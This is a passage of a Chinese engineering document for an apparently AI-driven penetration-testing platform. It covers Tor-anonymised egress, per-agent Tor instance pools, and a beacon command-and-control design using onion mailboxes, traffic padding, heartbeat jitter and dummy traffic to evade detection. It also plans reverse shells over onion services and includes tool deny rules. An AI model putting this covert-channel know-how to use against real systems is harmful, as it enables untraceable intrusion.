| 加密 | 预共享密钥派生 XChaCha20-Poly1305，**应用层端到端** | CDN/第三方终止 TLS 也看不到内容 |
| 定长填充 | 所有报文填充到固定档位（如 4KB 整数倍） | 防流量大小指纹 |
| 指令队列 | 操作端写入加密 blob，目标取走并回写 `ack` | 无需长连接 |
| 抗重放 | 单调计数器 + 信道级 nonce | 防第三方重放注入 |
| 心跳抖动 | 基础间隔 ± 40–60% 随机，不低于下限 | 打断「每 60 秒准点」的检测特征 |
| 伪装流量 | 周期发送空载荷（纯填充）心跳 | 让「有指令」与「无指令」的流量不可区分 |
| 失败静默 | 连续失败不改变节奏、不放大错误 | 避免异常行为成为告警信号 |

#### 14.8.5 逐层暴露面与对策

| 层 | 可能泄露什么 | 对策 |
|---|---|---|
| DNS | 平台解析信箱域名时的来源 IP | 操作端解析走 Tor（`socks5h`） |
| TLS | 证书 SAN、签发来源 | 只使用 CDN 侧签发的证书；不在源站申请 |
| HTTP 头 | `X-Forwarded-For`、`Referer`、UA 指纹 | 统一出口 UA/时区；剥离所有转发头 |
| 应用层 | 错误页、时间戳、语言 | 响应固定模板；时间统一 UTC |
| 第三方日志 | 操作端 IP、账号 | 账号与出口隔离；轮询经 Tor |
| 目标侧抓包 | 目标看到的信箱地址 | 信箱地址本身即一次性；泄露可即时吊销重建 |
| 关联分析 | 信箱地址与团队其他资产同域 | 信箱使用独立注册信息与独立解析 |

#### 14.8.6 平台侧能力与数据模型

| 能力 | 说明 |
|---|---|
| 信道注册 | 创建 `channel_id`、选择信箱类型、生成预共享密钥 |
| 指令队列 | 写入指令、查看待取、超时作废 |
| 心跳看板 | 最近心跳时间、累计信标数、异常静默告警 |
| 吊销重建 | 一键作废信箱并生成新地址（旧地址失效） |
| 出口约束 | 操作端轮询强制经 Tor，不可关闭 |

```sql
CREATE TABLE beacon_channels (
  id           BIGSERIAL PRIMARY KEY,
  channel_id   TEXT UNIQUE NOT NULL,
  agent_key    TEXT NOT NULL,
  task_id      BIGINT,
  kind         TEXT NOT NULL,   -- onion|cdn_front|third_party
  endpoint     TEXT NOT NULL,   -- 目标侧看到的地址
  psk_wrapped  BYTEA NOT NULL,  -- 加密存储的预共享密钥
  created_at   TIMESTAMPTZ DEFAULT now(),
  revoked_at   TIMESTAMPTZ
);

CREATE TABLE beacon_messages (
  id          BIGSERIAL PRIMARY KEY,
  channel_id  TEXT NOT NULL REFERENCES beacon_channels(channel_id),
  direction   TEXT NOT NULL,     -- in|out
  seq         BIGINT NOT NULL,   -- 抗重放
  payload     BYTEA NOT NULL,    -- 已加密
  created_at  TIMESTAMPTZ DEFAULT now(),
  consumed_at TIMESTAMPTZ
);
```

#### 14.8.7 信箱的归属：它是「角色」，不是「地点」

「信箱」指一个**双方都能读写、但都不暴露自身 IP 的中间存储**。它不限定由谁搭建，
三种归属都成立，但约束不同：

| 归属 | 具体形态 | 目标看到 | 平台 IP 暴露 | 代价 |
|---|---|---|---|---|
| **我们自建（暴露型）** | VPS 上直接开 HTTP 接口 | VPS 公网 IP | ❌ 暴露 | **不可用**——退化成 T1 |
| **我们自建（隐藏型 A）** ✅ **已选定** | VPS 跑 `tor` + `HiddenService` + **客户端授权** | `xxx.onion` | ✅ 不暴露 | 目标必须能跑 Tor 客户端并持密钥；RTT 2s 级 |
| **我们自建（隐藏型 B）** | VPS + CDN 前置 + 源站只放行 CDN 段 | CDN 边缘 IP | ✅ 不暴露 | 需过 §14.4 的 7 项自查；CDN ToS 风险 |
| **第三方平台现成** | 对象存储 / paste / IM Bot / 代码托管 / DNS TXT | 第三方域名 | ✅ 不暴露 | 留痕在第三方；账号可能被封；平台能看元数据 |
| **目标服务器上** | —— | —— | —— | **不成立**：目标随时可能下线；操作端要读就得直连目标，反而暴露 IP。仅「已控跳板机做横向会合点」是另一种东西，不属于信标 |

结论：

- **自建只允许「隐藏型」**——裸 IP 开接口等于没有信箱。
- **第三方平台最省事**，代价是把元数据（时间、大小、来源 IP）交给对方，因此操作端轮询
  必须经 Tor（见 §14.8.3）。
- **目标侧搭信箱在信标语境下没有意义**，不要考虑。

#### 14.8.8 什么算一个合格的信箱

不管谁提供，只要满足下面 5 条就能接进适配器：

1. `write(channel_id, blob)` / `read(channel_id)` / `delete(channel_id)` 三个原语；
2. 双方都能匿名可达（不需要对方真实 IP）；
3. 载荷视为不透明字节流（我们自己加密，不依赖对方加密）；
4. 支持按时间或序号拉取增量（避免全量轮询）；
5. 无强制实名或强绑定（否则匿名链断在账号上）。

#### 14.8.9 上线硬性检查

1. 目标侧地址解析结果**不得属于平台 IP 段**，也不得等于任何已登记的自有 VPS IP；
2. 操作端轮询配置**必须**带 Tor 出口，未配置则拒绝启用该信道；
3. 信箱域名与平台其他资产**无共同注册信息、无共同解析**；
4. 预共享密钥不得出现在日志、提示词、审计表明文字段中；
5. 信道启用前跑一次「模拟目标视角」的探测，确认拿不到源站信息。

## 15. 安全兜底与失败语义（P0）

这一章是「不做就等于没做」的部分。

### 15.1 失败绝不回退直连

```go
// 任一匿名出口不可用时，必须返回错误并中止该动作。
// 绝不允许 fallback 到 DIRECT —— 那会把真实 IP 直接暴露给目标。
if plan.Mode == "tor" && !torHealthy() {
    return EgressPlan{}, fmt.Errorf("匿名出口不可用，已中止（不会回退直连）")
}
```

同时在 UI 上把「匿名出口不可用」做成显式阻断态，而不是静默降级。

### 15.2 DNS 必须走 Tor

仅靠 `socks5h` 只覆盖 curl。以下仍会本地解析并泄露：

| 泄露点 | 处理 |
|---|---|
| Go 的 `net.Resolver`（enrich、WebFetch 之外的直连请求） | 统一走 Tor 的 `DNSPort`，或强制经 SOCKS 远程解析 |
| `dig` / `nslookup` / `host` | Tor 模式下拦截执行 |
| 工具内建解析（ffuf 域名、`nmap -sL`、subfinder 的 API 解析） | 归类为 `target-probe`，经 SOCKS 代理并禁用本地解析选项 |
| `nmap` 默认反查 | 强制 `-n`（不解析） |

建议在容器内把 `/etc/resolv.conf` 指向 Tor 的 DNSPort（`DNSPort 172.18.0.1:5353`），
形成「兜底式」保护——即使某个工具忽略了代理变量，DNS 也不会泄露。

### 15.3 工具级门控（不能只靠提示词）

Tor 模式下在**执行层**拒绝：

| 拒绝项 | 原因 |
|---|---|
| UDP 扫描（`nmap -sU`、`masscan`、`naabu -udp`） | Tor 不支持 UDP |
| `dig` / `nslookup` / `host` / `whois` 直连 | DNS 与 whois 会泄露真实 IP（whois 归 `intel-query`，允许直连） |
| 缺少 `--socks5-hostname` 的 curl | 会本地解析 |
| 并发超过阈值（默认 2） | 打满电路、触发目标封禁 |

实现方式：自定义工具（`kind=shell`）增加 `egress_class` 与 `needs_udp` 两个字段，
执行前校验；命中拒绝时返回明确原因，而不是静默失败。

### 15.4 平台自身流量显式排除

以下必须设置 `NO_PROXY`，避免被 Tor 拖慢或泄露凭据：

`selfupdate`、工具/镜像下载、LLM provider（`agent/provider.go` 的 `quotaAwareHTTPClient`
已默认不回退环境变量）、`notify/http.go`（已有意不复用全局代理）。

### 15.5 录制策略

| 模式 | 留痕 | 隔离粒度 |
|---|---|---|
| Tor + 捕获 ON（MITM 上游 = Tor） | 全量落库 ✅ | 全局单一电路 ⚠️ |
| Tor + 捕获 OFF（直接注入 socks5h） | 无留痕 ❌ | 任务级隔离 ✅ |

建议默认 **Tor 模式强制开启捕获**——渗透平台的留痕链比电路隔离更重要；确实需要任务级
隔离时，由用户在 Agent 配置里显式关闭捕获并接受「无留痕」提示。

## 16. 出口效能与反检测

### 16.1 出口被封的三段式处理

Tor exit 在高安全目标上极常见地被封，必须做成自动化流程：

1. **识别**：响应出现 403 / Cloudflare challenge / 空响应 / 显著超时；
2. **重试**：标记当前出口为「对该目标不可用」，触发 `NEWNYM` 换电路后重试一次；
3. **判定**：换后仍失败 → 判定「该目标封禁 Tor」，写入任务级提示并在 UI 展示，
   不再无意义重试。

### 16.2 出口可见性预判

在任务开始前做一次对照探测（直连 vs Tor 各一次 HEAD 请求），得出：

- 目标是否对 Tor 返回不同状态码；
- 延迟差异是否超出可用范围；
- 是否需要改用其他匿名出口（住宅代理）。

结果写入任务提示，让操作者在「用 Tor 硬打」和「换出口」之间做有依据的选择——这正是
「平台侧透明」的具体形态。

### 16.3 浏览器指纹一致性

浏览器 MCP 走 Tor 时，出口国家/时区/语言若不匹配，指纹自相矛盾，比直连更可疑。需要：

- 按出口国家设置时区与 `Accept-Language`；
- 禁用 WebRTC（防真实 IP 泄露）；
- 实测出口 IP 与 `navigator` 时区一致性检查。

### 16.4 桥接（受限网络）

若目标网络或 ISP 封锁 Tor 直连，需要 `obfs4` / `snowflake` 桥接。属可选能力，
放在 P5 评估，不阻塞主线。

### 16.5 成本与配额

记录每个任务经 Tor 的请求数与累计耗时，用于判断「该任务是否值得继续用 Tor」；
与 §3.2 审计表共用一次写入。

## 17. 决策记录

| 编号 | 决策 | 状态 |
|---|---|---|
| D-01 | 出口能力挂在 **Agent 级**，不做全局代理卡片 | 已定 |
| D-02 | 前期探测**强制匿名**，任何触达目标的流量不得暴露真实 IP | 已定 |
| D-03 | 第三方情报 API（FOFA / Shodan / Whois 等）走**直连真实 IP** | 已定 |
| D-04 | 失败**不得回退直连**，匿名出口不可用即中止 | 已定 |
| D-05 | 入站通道**禁止裸公网 IP** | 已定 |
| D-06 | 信箱采用 **VPS 自建 Onion Service**，不依赖第三方存活 | 已定 |
| D-07 | Onion **必须启用客户端授权**，裸 Onion 不在可选范围 | 已定 |
| D-08 | 反弹 shell 走 Onion；HTTPS 信标优先 CDN 前置 / 信箱 | 已定 |
| D-09 | 客户端授权采用 **v3 `authorized_clients/` 文件方案**（v2 选项已废弃） | 已定（已实测验证） |
| D-10 | 客户端授权密钥由平台自行生成（`tor --keygen` 不支持 x25519 客户端密钥） | 已定（已实测验证） |

### 实施确认（2026-10-24）

| 项 | 决定 |
|---|---|
| 默认出口策略 | **fail-closed**：默认匿名，匿名出口不可用即拒绝执行，不提供直连降级 |
| 情报 API 白名单 | `fofa.info`、`api.shodan.io`、`quake.360.cn` 等（可后续追加） |
| DNS 策略 | **兜底 + 精确**：容器 `resolv.conf` 指向 Tor `DNSPort`，同时工具层强制 `socks5h` |
| Onion 部署 | 本期**只写代码**，不在现有 VPS 上线 |
| 目标侧形态 | 混合：按目标能力自动选择 Onion（可跑 Tor 客户端）或 CDN 前置（仅 HTTP） |
| UI 范围 | 本期与后端一并实现 |

> fail-closed 的影响：平台默认状态下所有 `target-probe` 流量将被拒绝，直到配置了可用的
> 匿名出口。这是刻意的——宁可停摆，不可误走直连。

### 仍待定

| 编号 | 事项 |
|---|---|
| O-01 | 信标协议细节（心跳基准、填充档位、伪装流量比例） |
| O-02 | 是否引入多 Tor 实例做 per-Agent 独立出口 |
| O-03 | 第三方信箱作为「协议验证用」是否保留在最终方案内 |

## 18. 实施进度（2026-10-24）

| 模块 | 文件 | 状态 |
|---|---|---|
| `socks5h` 远程 DNS | `agent/worker.go`、`traffic/traffic.go` | ✅ 已实现 + 测试 |
| 出口数据模型 | `db/schema.sql`（agents / tools / 两张新表） | ✅ |
| 出口路由器 + fail-closed | `server/egress.go` | ✅ 黑洞兜底，9 个测试 |
| 工具执行门控 | `server/customtool.go` | ✅ UDP / 无匿名出口拒绝 |
| Tor 控制口 | `tor/control.go` | ✅ NEWNYM / RELOAD / ExitNodes |
| 提示词注入 | `agent/egress.go` | ✅ worker/planner/main/chat |
| 出口审计 | `server/engine.go`、`db/egress.go` | ✅ 后台探测出口 IP |
| Agent 级 API | `server/egress_api.go` | ✅ get / test / newnym / runs |
| Agent 配置 UI | `web/src/components/agent-editor.tsx` | ✅「出口」Tab |
| 系统配置 UI | `web/src/app/(main)/system/settings/page.tsx` | ✅ Tor + 严格模式 |
| Onion + 客户端授权 | `inbound/keys.go`、`inbound/onion.go` | ✅ 7 个测试 |
| 入站 API / UI | `server/inbound_api.go`、`/system/inbound` | ✅ |
| 信标帧协议 | `beacon/crypto.go` | ✅ 定长 4KB、抗重放 |
| 信箱适配器 | `beacon/mailbox.go` | ✅ HTTP + File |
| 信标通道 API | `server/beacon_api.go` | ✅ 含 flush / pull |
| 信标 UI | `web/src/app/(main)/system/beacon/page.tsx` | ✅ |
| 目标侧信标客户端 | `beacon/client.go`、`cmd/beacon-client` | ✅ 默认不执行命令 |
| **多 Tor 实例池** | `torpool/`、`server/torpool_api.go` | ✅ 每 Agent 独立 daemon，NEWNYM 只作用于该 Agent |
| **真实环境 E2E** | `torpool/e2e_test.go`、`server/torpool_e2e_test.go`（`-tags e2e`） | ✅ 双 daemon 独立出口 + 换电路作用域验证 |

### 尚未实现

| 项 | 说明 |
|---|---|
| DNS 兜底 | 容器 `resolv.conf` → Tor `DNSPort` |
| CDN 前置 7 项自查 | `inbound/cdn_front.go` |
| 部署 | VPS 上的 ARTEX 已于 2026-10-24 拆除；本特性目前仅本地代码 |
| 池化后的入站联动 | 多实例尚未与 `inbound`（onion）共享实例，onion 仍走独立 daemon |


## 19. 多 Tor 实例（per-Agent 独立出口）

### 19.1 为什么需要

Tor 的 `SIGNAL NEWNYM` 是**进程级**操作：单 daemon 下给一个 Agent 换电路，会同时换掉所有
Agent 的电路。后果有两个：

1. **相关性信号**：多个 Agent 在同一秒全部换出口，在目标侧是可观测的同步行为；
2. **无法分节奏**：无法让扫描 Agent 频繁换出口、同时保持登录态 Agent 的出口稳定。

实例池把「换电路」的作用域从 daemon 缩小到某 Agent 的槽位。

### 19.2 结构

```
torpool.Pool
├── tor-01/ torrc + data + control_auth_cookie   127.0.0.1:19050 socks / 19051 ctl
├── tor-02/ ...                                  127.0.0.1:19051 ... 19151
└── tor-03/ ...
```

- 端口分配：`socks = tor_pool_socks_base + (slot-1)`，`control = tor_pool_control_base + (slot-1)`；
  端口范围重叠在 `New()` 阶段直接报错，避免出现「实例起来了但控制口是别人的」。
- 每个实例独立 `DataDirectory`（独立 guard/consensus 缓存）、独立 cookie 文件。
- 启动是**全有或全无**：任一实例在 `StartupTimeout` 内未就绪（SOCKS 可连 + cookie 存在 + 控制口可连），
  其余实例立即回滚停止，绝不留半个池（半个池会让部分 Agent 静默直连）。
- 可选 `UpstreamProxy`：`torrc` 写入 `HTTPSProxy <host:port>`，用于直连 guard 被阻断的网络
  （中国大陆常见），凭据以 `user:pass@host:port` 形式给出。

### 19.3 分配策略

| 配置 | 行为 |
|---|---|
| `agents.egress_tor_instance = 0` | 按 `fnv32a(agent_key) % pool_size` 稳定分配——同一 Agent 永远同一出口 |
| `agents.egress_tor_instance = N` | 固定第 N 个实例（1-based，越界或池未启用时 API 拒绝） |

稳定性是刻意的：任务中途换出口在目标侧等同于「换了个人」。

### 19.4 与解析器的关系

`resolveEgress` 在 `egress_mode=tor` 分支里：

1. 池存在（`m.torPool != nil`，只有 Start 成功才会被赋值）→ 取该 Agent 的槽位 SOCKS 地址；
2. 否则回落 `tor_socks_addr`，再否则回落 `global_proxy`（与旧版行为一致）；
3. 解析结果带 `tor_instance`，API/审计可看到「这次流量走的是哪个槽位」。

`socks5h://` 与 SOCKS 用户名（`IsolateSOCKSAuth`）两层隔离都保留：即使两个 Agent 落到同一槽位，
按 `agent-<key>` / `task-<id>` 仍然拿到不同电路。

### 19.5 配置项

| 键 | 默认 | 说明 |
|---|---|---|
| `tor_pool_enabled` | false | 开启后启用池；关闭时用单 daemon |
| `tor_pool_size` | 3 | 实例数（1..32） |
| `tor_pool_socks_base` | 19050 | 槽位 1 的 SOCKS 端口 |
| `tor_pool_control_base` | 19150 | 槽位 1 的控制口 |
| `tor_pool_dir` | `<dataDir>/torpool` | 每槽位子目录根 |
| `tor_binary` | `tor` | 可执行文件路径 |

API：`GET /api/system/torpool`（状态 + 实例健康）、`POST /api/system/torpool/start|stop`、
`PUT /api/system/torpool`（保存并应用）。UI：系统配置页「Tor 实例池」区块 + Agent 编辑器「出口」Tab 的实例选择。

### 19.6 失败语义

| 情况 | 行为 |
|---|---|
| 池启动失败（tor 缺失/端口占用/超时） | 记录日志，平台照常启动；`m.torPool` 保持 nil，于是回落到单 daemon 或 fail-closed 黑洞 |
| 运行中某实例挂掉 | 该槽位连接失败 → Agent 侧表现为代理不可达（不会回退直连）；`GET /api/system/torpool` 显示 `running=false` |
| 关闭池 | 停止全部 daemon，解析立即回落到单 daemon 配置 |

### 19.7 端到端验证（真实 Tor）

```bash
# 需先有 tor 可执行文件；若直连 guard 被阻断，用本机代理作为 Tor 的上游
ARTEX_TOR_UPSTREAM=127.0.0.1:7897 \
  go test ./torpool/ ./server/ -tags e2e -run E2E -v -timeout 20m
```

两个用例：

1. `TestE2EPoolTwoDaemonsRouteThroughTor`：两个 daemon 均启动成功，各自 SOCKS 访问
   `check.torproject.org/api/ip` 返回 `IsTor=true`（证书链、cookie 认证、IsolateSOCKSAuth 一起被验证）。
2. `TestE2ENewNymIsScopedToInstance`：只对槽位 1 调 `SIGNAL NEWNYM`，判定条件是
   **槽位 2 的 circuit-status 集合没有新增电路**、且槽位 2 出口 IP 不变；槽位 1 出口 IP 必须改变。
3. `TestE2EAgentsGetIndependentTorExits`（server 包）：两个 Agent 分别 pin 槽位 1/2，
   `resolveEgress` 产出的 SOCKS 地址不同，且各自出口确认是 Tor。

实测结果（2026-10-24，macOS + Tor 0.4.8.x，`ARTEX_TOR_UPSTREAM=127.0.0.1:7897`）：

```
--- PASS: TestE2EPoolTwoDaemonsRouteThroughTor (76.84s)
    instance 1: socks=127.0.0.1:19350 exit=45.66.35.21   tor=true
    instance 2: socks=127.0.0.1:19351 exit=204.8.96.183  tor=true
--- PASS: TestE2ENewNymIsScopedToInstance (91.02s)
    before: inst1=45.66.35.13  inst2=192.42.116.57  inst2circuits=4
    after:  inst1=171.25.193.46 inst2=192.42.116.57 inst2circuits=4 new=[]
--- PASS: TestE2EAgentsGetIndependentTorExits (44.27s)
    slot1 socks5h://127.0.0.1:19550 -> 204.8.96.155
    slot2 socks5h://127.0.0.1:19551 -> 192.42.116.17
```

### 19.8 E2E 暴露并修掉的两个真实缺陷

| 缺陷 | 现象 | 修复 |
|---|---|---|
| 就绪判断不等于可用 | SOCKS 端口一开就返回 "ready"，但 Tor 还在 bootstrap，请求全部挂到超时（首个 E2E 就是这么失败的） | `waitReady` 增加控制口 `GETINFO status/bootstrap-phase` 门控，必须 `PROGRESS=100` 才算就绪 |
| 用出口 IP 判断"是否换电路"会误报 | `check.torproject.org` 是 CDN，多次解析到不同地址 → Tor 为每个目的地各建一条电路 → 出口 IP 看似乱变，误判成"实例 2 被轮换" | 改用固定单一地址 `https://1.1.1.1/cdn-cgi/trace` 取出口 IP，并用 `GETINFO circuit-status` 的电路 ID 集合作为判定依据 |

## 20. 回归测试（真实 Tor + 本地平台）

脚本：`test/regression/tor_features.sh`（41 项断言，覆盖池 / 解析 / 实测 / 换电路 / fail-closed / onion / 信标）

```bash
# 1) 本地 PG + 后端（示例）
pg_ctl -D /usr/local/var/postgresql@18 start
ARTEX_PG_DSN="postgres://USER@127.0.0.1:5432/artex_regress?sslmode=disable" \
  ./artex -addr 127.0.0.1:8899 -data /tmp/artex-regress/data

# 2) 初始化管理员并取 JWT
curl -X POST :8899/api/auth/init  -d '{"password":"..."}'
curl -X POST :8899/api/auth/login -d '{"username":"ARTEX","password":"..."}' > /tmp/artex-regress/token.txt

# 3) 跑回归（Tor 直连被阻断时给 daemon 一个上游代理）
ARTEX_TOR_BIN=/usr/local/opt/tor/bin/tor ARTEX_TOR_UPSTREAM=127.0.0.1:7897 \
  bash test/regression/tor_features.sh
```

最近一次结果：**41/41 PASS**（池 2 实例、两 Agent 分槽、探测 is_tor=true、NEWNYM scope=instance、真实 `.onion` 生成 + 客户端授权、停池后 fail-closed 拒绝）。

### 20.1 回归抓到的真实缺陷（均已修复）

| # | 缺陷 | 影响 | 修复 |
|---|---|---|---|
| 1 | `HiddenServicePort <loopback目标>` 语法错误 | **onion 服务根本起不来**（Tor: "Missing or invalid port"），入站功能整体不可用 | 改为 `HiddenServicePort <virtport> <target>` + `HiddenServiceVersion 3`；新增单测 |
| 2 | `Instance.Running()` 用 `Process.Signal(nil)` | Unix 上恒返回错误 → 所有实例永远显示「停止」，UI 健康状态失真 | 改用 `syscall.Signal(0)` |
| 3 | `/api/system/torpool` 用原始 `Instances()` 覆盖 `status.instances` | 丢掉 `running` / `cookie_ready` 字段 | 直接返回 `Status()` |
| 4 | `EgressPlan` 字段无 json tag | API 输出 Go 字段名（`Mode`/`ProxyURL`），与其他接口 snake_case 不一致 | 统一 snake_case |
| 5 | 后端重启后遗留 daemon 占端口 | 新进程 bind 失败 → 池启动失败，日志只有 "cookie missing"，排查困难 | 启动前**接管**自有过期实例（校验 `GETINFO config-file` 指向本槽 torrc）+ 端口被外部占用时给出明确错误 + cookie 新鲜度校验 |
| 6 | `tor_pool_size` 返回实时 size（未运行时为 0）、base 端口未回传 | 设置页显示 0 / 19050，误保存会丢配置 | 暴露配置值 `tor_pool_size` / `tor_pool_socks_base` / `tor_pool_control_base` |

> 第 1 项尤其关键：没有真实 Tor 参与的 E2E 永远发现不了——平台自己生成的 torrc 片段在 Tor 里是非法配置。
